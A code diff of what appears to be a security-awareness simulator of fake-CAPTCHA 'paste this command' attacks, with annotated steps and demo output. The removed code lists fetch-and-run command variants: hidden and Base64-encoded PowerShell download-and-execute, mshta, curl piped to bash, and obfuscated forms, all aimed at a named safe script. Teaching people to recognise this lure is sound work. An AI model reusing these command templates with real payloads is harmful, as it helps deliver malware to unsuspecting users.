+    const platformHint = `${browserNavigator.userAgentData?.platform ?? ""} ${navigator.platform ?? ""} ${navigator.userAgent}`.toLowerCase();
+    const selectedPlatform: Platform = platformHint.includes("mac") || platformHint.includes("iphone") || platformHint.includes("ipad")
+      ? "macos"
+      : platformHint.includes("win")
+        ? "windows"
+        : "linux";
+    const platform = platforms[selectedPlatform];
+
+    const get = <T extends Element>(selector: string) => root.querySelector<T>(selector)!;
+    const all = <T extends Element>(selector: string) => root.querySelectorAll<T>(selector);
+    const panels = {
+      instructions: get<HTMLElement>("[data-instructions]"),
+      command: get<HTMLElement>("[data-command]"),
+      consequence: get<HTMLElement>("[data-consequence-panel]"),
     };
 
-    // --- Logic ---
+    function setStep(step: 1 | 2 | 3 | 4) {
+      root.dataset.step = String(step);
+      all<HTMLElement>("[data-progress]").forEach((item) => {
+        const itemStep = Number(item.dataset.progress);
+        item.classList.toggle("is-active", itemStep === step);
+        item.classList.toggle("is-done", itemStep < step);
+      });
 
-    function detectOS() {
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes("mac") || ua.includes("linux")) return "unix";
-        return "windows";
+      get<HTMLElement>("[data-lure]").hidden = step !== 1;
+      panels.instructions.hidden = step !== 2;
+      panels.command.hidden = step !== 3;
+      panels.consequence.hidden = step !== 4;
+      get<HTMLElement>("[data-screen-copy]").hidden = step >= 3;
+      get<HTMLElement>("[data-annotations]").hidden = step !== 3;
+      get<HTMLElement>("[data-browser-chrome]").hidden = step === 4;
+      get<HTMLElement>("[data-terminal-chrome]").hidden = step !== 4;
+
+      const notes = [
+        ["Fake CAPTCHA", "The page looks like a normal verification check."],
+        ["Instructions", "A CAPTCHA should never ask you to open a system tool or paste a command."],
+        ["Copied command", platform.commandNote],
+        ["Terminal output", "The command ran in the local terminal. This demo script only prints text; a real payload could do anything allowed by the user account."],
+      ];
+      const note = notes[step - 1];
+      get<HTMLElement>("[data-note-step]").textContent = `0${step}`;
+      get<HTMLElement>("[data-note-title]").textContent = note[0];
+      get<HTMLElement>("[data-note-copy]").textContent = note[1];
     }
 
-    function getTypeInstruction() {
-        if (state.platform === "windows")
-            return `1. Press <strong>Windows Key + R</strong><br>2. Press <strong>Ctrl + V</strong><br>3. Press <strong>Enter</strong>`;
-        // Combined Mac/Unix instruction
-        return `1. Open Terminal (Cmd + Space, type "Terminal")<br>2. Paste Command (Cmd + V)<br>3. Press Enter`;
-    }
+    get<HTMLElement>("[data-detected-os]").textContent = platform.label;
+    all<HTMLElement>("[data-instruction]").forEach((item, index) => item.textContent = platform.instructions[index]);
+    get<HTMLElement>("[data-tool-label]").textContent = platform.tool;
+    get<HTMLElement>("[data-command-code]").textContent = platform.command;
+    get<HTMLElement>("[data-terminal-command]").textContent = platform.command;
+    get<HTMLElement>("[data-terminal-title]").textContent = platform.terminalTitle;
+    get<HTMLElement>("[data-terminal-prompt]").textContent = platform.terminalPrompt;
+    get<HTMLAnchorElement>("[data-script-link]").href = platform.scriptUrl;
+    all<HTMLElement>("[data-annotation-title]").forEach((item, index) => item.textContent = platform.annotations[index][0]);
+    all<HTMLElement>("[data-annotation-copy]").forEach((item, index) => item.textContent = platform.annotations[index][1]);
 
-    function getPayloadCode() {
-        const v = state.variant;
-
-        // Windows Variants
-        if (v === "powershell-hidden") {
-            return `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
-        }
-        if (v === "powershell-enc") {
-            const cmd = `IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')`;
-            // PowerShell -EncodedCommand expects Base64-encoded UTF-16LE
-            const charCodes = [];
-            for (let i = 0; i < cmd.length; i++) {
-                const code = cmd.charCodeAt(i);
-                charCodes.push(code & 0xff); // Low byte
-                charCodes.push((code >> 8) & 0xff); // High byte (always 0 for ASCII)
-            }
-            const b64 = btoa(String.fromCharCode(...charCodes));
-            return `powershell -Enc ${b64}`;
-        }
-        if (v === "mshta") {
-            return `mshta "${baseUrl}/static/fake-error.hta"`;
-        }
-        if (v === "batch") {
-            return `cmd.exe /c start /min powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
-        }
-
-        // *nix Variants
-        if (v === "curl-basic") {
-            return `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
-        }
-        if (v === "base64-pipe") {
-            const cmd = `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
-            const b64 = btoa(cmd);
-            return `echo "${b64}" | base64 -d | sh`;
-        }
-        if (v === "stealth-obf") {
-            return `c\\u\\r\\l -s ${SAFE_SCRIPT_UNIX} | b\\a\\s\\h`;
-        }
-
-        return "Error: Unknown Variant";
-    }
-
-    function update() {
-        // 1. Show UI
-        Object.values(els.scenarios).forEach(
-            (el) => el && el.classList.add("hidden")
-        );
-        if (els.scenarios[state.scenario]) {
-            els.scenarios[state.scenario].classList.remove("hidden");
-        }
-
-        // 2. Update Instructions Text
-        const instr = getTypeInstruction();
-        els.instr.all.forEach((el) => (el.innerHTML = instr));
-
-        // 3. Reset Scenario States
-        if (els.meetStep1) els.meetStep1.classList.remove("hidden");
-        if (els.meetStep2) els.meetStep2.classList.add("hidden");
-        if (els.cfStep2) els.cfStep2.classList.add("hidden");
-        if (els.cfLoading) els.cfLoading.classList.add("hidden");
-        if (els.cfCheck) els.cfCheck.checked = false;
-        if (els.rcStep2) els.rcStep2.classList.add("hidden");
-        if (els.rcCheck) els.rcCheck.checked = false;
-        els.explBox.classList.add("hidden");
-    }
-
-    function updateVariants() {
-        const opts = variants[state.platform] || variants["windows"];
-        els.variantSelect.innerHTML = opts
-            .map((o) => `<option value="${o.id}">${o.label}</option>`)
-            .join("");
-        state.variant = opts[0].id;
-    }
-
-    // listeners
-    els.scenarioSelect.addEventListener("change", (e) => {
-        state.scenario = e.target.value;
-        update();
+    get<HTMLButtonElement>("[data-trigger]").addEventListener("click", () => setStep(2));
+    get<HTMLButtonElement>("[data-reveal]").addEventListener("click", async () => {
+      const status = get<HTMLElement>("[data-copy-status]");
+      try {
+        await navigator.clipboard.writeText(platform.command);
+        status.textContent = "Copied to clipboard";
+      } catch {
+        status.textContent = "Copy blocked — select manually";
+      }
+      setStep(3);
     });
-
-    els.platformSelect.addEventListener("change", (e) => {
-        state.platform = e.target.value;
-        updateVariants();
-        update();
+    get<HTMLButtonElement>("[data-consequence]").addEventListener("click", () => setStep(4));
+    get<HTMLButtonElement>("[data-reset]").addEventListener("click", () => {
+      get<HTMLElement>("[data-copy-status]").textContent = "Harmless demo command";
+      setStep(1);
     });
-
-    els.variantSelect.addEventListener("change", (e) => {
-        state.variant = e.target.value;
-    });
-
-    els.closeExplBtn.addEventListener("click", () =>
-        els.explBox.classList.add("hidden")
-    );
-
-    // Copy Logic
-    document.querySelectorAll(".btn-fake-copy").forEach((btn) => {
-        btn.addEventListener("click", async () => {
-            const code = getPayloadCode();
-            try {
-                await navigator.clipboard.writeText(code);
-                els.payloadCode.innerText = code;
-                els.explBox.classList.remove("hidden");
-
-                // Button Feedback
-                const oldText = btn.innerText;
-                btn.innerText = "Copied!";
-                setTimeout(() => (btn.innerText = oldText), 2000);
-            } catch (e) {
-                console.error(e);
-            }
-        });
-    });
-
-    // Scenario Specific Logic-
-    // Meet
-    const meetVideoText = document.querySelector(".meet-video-text");
-
-    // "Fix it" -> Go to Step 2 (Instructions)
-    document.querySelectorAll(".btn-meet-fix").forEach((el) => {
-        el.addEventListener("click", () => {
-            if (els.meetStep1) els.meetStep1.classList.add("hidden");
-            if (els.meetStep2) els.meetStep2.classList.remove("hidden");
-        });
-    });
-
-    // "Try again" -> Simulate Reconnection -> Fail back to Step 1
-    document.querySelectorAll(".btn-meet-try-again").forEach((el) => {
-        el.addEventListener("click", () => {
-            // 1. Hide Popups
-            if (els.meetStep1) els.meetStep1.classList.add("hidden");
-            if (els.meetStep2) els.meetStep2.classList.add("hidden");
-
-            // 2. Show Loading
-            if (meetVideoText) {
-                const oldText = meetVideoText.innerText;
-                meetVideoText.innerHTML =
-                    '<div class="spinner" style="border-top-color:white; margin:0 auto;"></div>';
-
-                setTimeout(() => {
-                    // 3. Fail
-                    meetVideoText.innerText = oldText;
-                    if (els.meetStep1) els.meetStep1.classList.remove("hidden");
-                }, 1500);
-            }
-        });
-    });
-
-    // Menu Kebab -> Toggle Step 2 (as a hidden feature or just reset?) -> Let's make it just show Step 1
-    document
-        .querySelector(".meet-popup-menu")
-        ?.addEventListener("click", () => {
-            // Just toggle functionality? Or do nothing?
-            // Let's leave it as is or remove listener if not needed.
-            // Reset to Step 1 for simplicity
-            if (els.meetStep1) els.meetStep1.classList.remove("hidden");
-            if (els.meetStep2) els.meetStep2.classList.add("hidden");
-        });
-
-    // Cloudflare
-    els.cfCheck?.addEventListener("change", () => {
-        els.cfLoading.classList.remove("hidden");
-        setTimeout(() => {
-            els.cfLoading.classList.add("hidden");
-            els.cfStep2.classList.remove("hidden");
-        }, 1500);
-    });
-
-    // ReCAPTCHA
-    els.rcCheck?.addEventListener("change", () => {
-        setTimeout(() => {
-            els.rcStep2.classList.remove("hidden");
-        }, 500);
-    });
-
-    // Init
-    const detected = detectOS();
-    state.platform = detected;
-    els.platformSelect.value = detected;
-    els.scenarioSelect.value = state.scenario;
-    updateVariants();
-    update();
+    setStep(1);
+  }
 </script>
+
+<style>
+  .simulator { margin-top: 0; overflow: hidden; border: 1px solid var(--line); border-radius: 4px; background: var(--surface); }
+  .simulator-topline { min-height: 40px; display: flex; justify-content: space-between; align-items: center; gap: 1rem; border-bottom: 1px solid var(--line); padding: 0.65rem 0.9rem; background: var(--paper-deep); color: var(--ink-soft); font-size: 0.7rem; font-weight: 700; }
+  .simulator-topline span:first-child { display: flex; align-items: center; gap: 0.45rem; }
+  .simulator-topline b { color: var(--ink); }
+  .simulator-topline i { width: 8px; height: 8px; border-radius: 50%; background: var(--safe); }
+  .simulator-body { padding: clamp(0.9rem, 2.5vw, 1.5rem); }
+
+  .progress { display: grid; grid-template-columns: repeat(4, 1fr); margin: 0 0 1.15rem; padding: 0; list-style: none; }
+  .progress li { position: relative; display: grid; grid-template-rows: 26px auto; gap: 0.4rem; justify-items: start; color: #7b858b; font-size: 0.7rem; font-weight: 700; }
+  .progress li::after { position: absolute; z-index: 0; top: 13px; right: 0; left: 26px; height: 1px; background: var(--line); content: ""; }
+  .progress li:last-child::after { display: none; }
+  .progress-marker { position: relative; z-index: 1; width: 26px; height: 26px; display: grid; place-items: center; border: 1px solid var(--line); border-radius: 50%; background: var(--surface); font-family: var(--font-mono); font-size: 0.62rem; }
+  .progress-label { grid-row: 2; }
+  .progress li.is-active { color: var(--ink); }
+  .progress li.is-active .progress-marker { border-color: var(--signal); background: var(--signal); color: #fff; }
+  .progress li.is-done .progress-marker { border-color: var(--safe); background: var(--safe-pale); color: var(--safe); }
+
+  .demo-workspace { display: grid; grid-template-columns: minmax(0, 1fr) 230px; border: 1px solid var(--line); }
+  .stage { min-width: 0; border-right: 1px solid var(--line); background: #f4f6f7; }
+  .browser-chrome { height: 40px; display: grid; grid-template-columns: 52px 1fr 52px; align-items: center; border-bottom: 1px solid var(--line); padding-inline: 0.7rem; background: #dfe3e5; }
+  .chrome-dots { display: flex; gap: 5px; }
+  .chrome-dots span { width: 8px; height: 8px; border-radius: 50%; background: #a8afb3; }
+  .address-bar { overflow: hidden; border-radius: 3px; padding: 0.25rem 0.5rem; background: #f7f8f9; color: #687279; font-size: 0.62rem; text-align: center; text-overflow: ellipsis; white-space: nowrap; }
+  .terminal-chrome { height: 40px; display: grid; grid-template-columns: 52px 1fr 52px; align-items: center; border-bottom: 1px solid #343c42; padding-inline: 0.7rem; background: #252b30; color: #c8d0d5; font-family: var(--font-mono); font-size: 0.62rem; text-align: center; }
+  .stage-screen { min-height: 420px; display: grid; align-content: center; padding: clamp(1.2rem, 3vw, 2.2rem); background: #f5f7f8; color: #272d31; }
+  .screen-copy { text-align: center; }
+  .screen-kicker { display: block; margin-bottom: 0.35rem; color: #5e686e; font-size: 0.64rem; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; }
+  .screen-copy h3 { margin-bottom: 0.5rem; font-size: clamp(1.35rem, 3vw, 1.9rem); letter-spacing: -0.035em; }
+  .screen-copy p { max-width: 390px; margin: 0 auto; color: #677178; font-size: 0.8rem; }
+  .lure-panel, .instruction-panel, .command-panel { width: min(100%, 430px); margin: 1.35rem auto 0; }
+
+  .captcha-box { width: min(100%, 340px); min-height: 76px; display: grid; grid-template-columns: 32px 1fr 52px; gap: 0.7rem; align-items: center; margin: auto; border: 1px solid #b9c0c4; border-radius: 3px; padding: 0.75rem; background: #fff; color: #333; cursor: pointer; text-align: left; }
+  .checkbox { width: 27px; height: 27px; border: 2px solid #667078; background: #fff; }
+  .verify-mark { display: grid; justify-items: center; color: #286bd6; font-size: 1.35rem; }
+  .verify-mark small { color: #727b80; font-size: 0.42rem; }
+
+  .instruction-panel { border: 1px solid #bdc4c8; padding: 1.15rem; background: #fff; }
+  .panel-heading { display: flex; gap: 0.55rem; align-items: center; border-bottom: 1px solid #e0e4e6; padding-bottom: 0.8rem; font-size: 0.76rem; }
+  .panel-heading > span { width: 23px; height: 23px; display: grid; place-items: center; border-radius: 50%; background: var(--signal); color: #fff; font-weight: 800; }
+  .instruction-panel ol { display: grid; gap: 0.65rem; margin: 0.9rem 0; padding: 0; list-style: none; }
+  .instruction-panel li { display: grid; grid-template-columns: 23px 1fr; gap: 0.55rem; align-items: center; }
+  .instruction-panel li > span { width: 23px; height: 23px; display: grid; place-items: center; border-radius: 50%; background: #edf0f1; font-size: 0.62rem; font-weight: 800; }
+  .instruction-panel li p { margin: 0; color: #4f595f; font-size: 0.75rem; }
+  .fake-copy-button, .continue-button { width: 100%; border: 0; border-radius: 3px; padding: 0.7rem 0.9rem; background: #176bd5; color: #fff; cursor: pointer; font-size: 0.74rem; font-weight: 700; }
+  .microcopy { margin: 0.6rem 0 0; color: #737d82; font-size: 0.62rem; text-align: center; }
+
+  .command-panel { margin-top: 0; }
+  .command-label { display: flex; justify-content: space-between; gap: 1rem; margin-bottom: 0.55rem; color: #687279; font-size: 0.62rem; }
+  .command-label span:first-child { color: var(--safe); font-weight: 800; text-transform: uppercase; }
+  .code-shell { overflow-x: auto; min-height: 110px; display: flex; align-items: center; border-radius: 3px; padding: 1rem; background: #171c20; color: #e8ecee; font-size: 0.72rem; line-height: 1.65; }
+  .code-shell code { padding: 0; background: transparent; color: inherit; overflow-wrap: anywhere; }
+  .source-link { margin: 0.55rem 0 0; color: var(--ink-soft); font-size: 0.62rem; }
+  .source-link a { font-weight: 700; }
+  .continue-button { margin-top: 0.8rem; background: var(--ink); }
+  .simulator[data-step="4"] .stage-screen { align-content: start; background: #101417; color: #dce3e7; }
+  .terminal-panel { width: 100%; font-family: var(--font-mono); font-size: 0.72rem; line-height: 1.65; }
+  .terminal-command { display: grid; grid-template-columns: auto minmax(0, 1fr); gap: 0.6rem; color: #f3f6f8; }
+  .terminal-command > span { color: #76d7ad; white-space: nowrap; }
+  .terminal-command code { min-width: 0; padding: 0; background: transparent; color: inherit; overflow-wrap: anywhere; }
+  .terminal-output { margin: 1.2rem 0 0; border: 0; padding: 0; background: transparent; color: #a9e8c8; font: inherit; white-space: pre-wrap; }
+  .terminal-exit { margin: 1rem 0 1.5rem; color: #89949b; }
+  .terminal-panel a { color: #fff; font-family: var(--font-sans); font-size: 0.72rem; font-weight: 700; }
+
+  .explanation { display: flex; flex-direction: column; padding: 1.1rem; background: #eef1f3; }
+  .explanation-heading { display: flex; gap: 0.65rem; align-items: center; margin-bottom: 0.65rem; }
+  .explanation-heading > span { color: var(--signal); font-family: var(--font-mono); font-size: 0.68rem; font-weight: 800; }
+  .explanation-heading strong { font-size: 0.78rem; }
+  .explanation > p { margin: 0; color: var(--ink-soft); font-size: 0.73rem; line-height: 1.5; }
+  .annotations { display: grid; gap: 0.85rem; margin-top: 1.1rem; border-top: 1px solid var(--line); padding-top: 1rem; }
+  .annotations > div { display: grid; grid-template-columns: 24px minmax(0, 1fr); gap: 0.6rem; align-items: start; }
+  .annotations > div > span { width: 22px; height: 22px; display: grid; place-items: center; border-radius: 50%; background: var(--warning); color: var(--ink); font-size: 0.6rem; font-weight: 800; }
+  .annotations p { min-width: 0; margin: 0; }
+  .annotations strong, .annotations small { display: block; }
+  .annotations strong { color: var(--ink); font-size: 0.7rem; line-height: 1.35; }
+  .annotations small { margin-top: 0.18rem; color: var(--ink-soft); font-size: 0.65rem; line-height: 1.45; }
+  .reset-button { margin-top: auto; border: 0; padding: 1.5rem 0 0; background: transparent; color: var(--ink-soft); cursor: pointer; font-size: 0.68rem; font-weight: 700; text-align: left; text-decoration: underline; text-underline-offset: 3px; }
+
+  [hidden] { display: none !important; }
+
+  @media (max-width: 760px) {
+    .demo-workspace { grid-template-columns: 1fr; }
+    .stage { border-right: 0; border-bottom: 1px solid var(--line); }
+    .explanation { min-height: 130px; }
+    .reset-button { margin-top: 0; }
+    .annotations { grid-template-columns: repeat(3, 1fr); }
+  }
+
+  @media (max-width: 560px) {
+    .simulator-topline span:last-child { display: none; }
+    .progress li { grid-template-rows: 26px; gap: 0; }
+    .progress-label { display: none; }
+    .progress li::after { right: 8px; left: 26px; }
+    .stage-screen { min-height: 440px; padding: 1rem; }
+    .annotations { grid-template-columns: 1fr; }
+  }
+</style>
